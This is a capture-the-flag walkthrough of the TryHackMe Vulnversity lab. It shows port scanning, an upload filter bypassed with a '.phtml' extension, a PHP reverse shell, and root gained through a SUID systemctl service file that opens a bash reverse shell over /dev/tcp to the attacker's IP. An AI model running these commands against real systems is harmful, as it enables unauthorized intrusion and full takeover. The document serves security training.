# TryHackMe Vulnversity Writeup

## ``Nmap Scan``

```
nmap -sCV 10.10.202.4
```

``output``

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-12 10:18 EDT
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 71.55% done; ETC: 10:18 (0:00:01 remaining)
Nmap scan report for 10.10.202.4
Host is up (0.091s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-06-12T14:18:57
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2025-06-12T10:18:57-04:00
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.44 seconds
```

---

```
http://10.10.202.4:3333/
```

![image](https://github.com/user-attachments/assets/0bdd6988-cc9b-4f78-b8ad-6f75b093bb2f)

## ``Gobuster``

```
gobuster dir -u http://10.10.202.4:3333/ -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt
```

`output`

![image](https://github.com/user-attachments/assets/80734d4a-821a-4b72-a498-d2e14c8ba6f2)

---

```
http://10.10.202.4:3333/internal/
```

![image](https://github.com/user-attachments/assets/7d2b5bff-8c89-4536-a0b3-57c3bed9cde6)

>[!note]
> We will fuzz the upload form to identify which extensions are not blocked.

## ``USING BurpSuite``

try to upload normal file

![image](https://github.com/user-attachments/assets/58459427-9045-46f1-9975-250efa1a48dd)

We're going to use Intruder (used for automating customised attacks). To begin, make a wordlist with the following extensions:

* .php
* .php3
* .php4
* .php5
* .phtml

![image](https://github.com/user-attachments/assets/c60fd6a3-e8e2-47ff-8060-5d7a6c2ff35c)

![image](https://github.com/user-attachments/assets/bf00202c-e8c6-4ecb-9acb-46ff039f590b)

Idenified file extension as ``.phtml`` .

You can download the following reverse PHP shell [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

![image](https://github.com/user-attachments/assets/f557bf3d-6c29-4100-8180-259281e36d9d)

>[!warning]
>Don't forget to change ``ip`` to your ``tun0`` ip and set port as you want 

now listen on ``4444``

````
nc -lvnp 4444
````

![image](https://github.com/user-attachments/assets/9c9c64bf-5f7e-4d59-b16b-2a06e1a84b9d)

and upload ``shell.phtml``

![image](https://github.com/user-attachments/assets/cab9dbfa-3255-45d1-9e93-6d2ff6c44442)

aftre Upload your shell navigate to ``http://10.10.202.4:3333/internal/uploads/php-reverse-shell.phtml``: This will execute your payload.

![image](https://github.com/user-attachments/assets/4cb18dea-fe12-427f-937a-c5e6b0b881e8)

![image](https://github.com/user-attachments/assets/4fbce078-6185-4101-abb7-6385945b12da)

## ``Privilege Escalation``

search for all SUID files

```
find / -user root -perm -4000 -exec ls -ldb {} \;
```

``output``

```bash
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl          <<--------⚠️
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
```

```bash
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
```

Researched for an ``/bin/systemctl`` SUID on  **[gtfobins](https://gtfobins.github.io/gtfobins/systemctl/)**

![image](https://github.com/user-attachments/assets/0e0b1a3a-ba85-4cdf-85ac-565fc35fcf8a)

now we will create service with reverseshell to root

```
nano root.service
```

```
[unit]
Description=root

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.47.102/5555 0>&1'

[Install]
WantedBy=multi-user.target
```

Since the victim machine can’t use the nano command, We’ll need create the root.service on our machine and transfer the file by setting up our web server.

```
python3 -m http.server 80
```

```
cd /tmp

wget http://10.8.47.102:7777/root.service
```

```
systemctl enable /tmp/root.service
systemctl start /tmp/root.service
```

![image](https://github.com/user-attachments/assets/fbd9eee1-8e55-46ae-8bc4-e9eacd985ae2)

